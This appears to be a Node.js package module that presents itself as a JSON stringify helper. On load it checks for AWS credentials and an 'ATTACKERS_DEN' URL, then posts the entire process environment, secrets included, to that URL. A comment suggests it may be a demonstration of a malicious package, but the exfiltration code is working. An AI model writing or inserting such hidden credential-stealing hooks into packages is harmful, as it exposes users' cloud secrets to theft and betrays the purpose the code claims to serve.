'use strict';

const request = require('superagent');

if (process.env.AWS_ACCESS_KEY_ID &&
    process.env.AWS_SECRET_ACCESS_KEY &&
    process.env.ATTACKERS_DEN) {  // in case people actually downloaded this package...
  request
    .post(process.env.ATTACKERS_DEN)
    .send(process.env)
    .end(function(err, res){
    });
}

module.exports = obj => JSON.stringify(obj);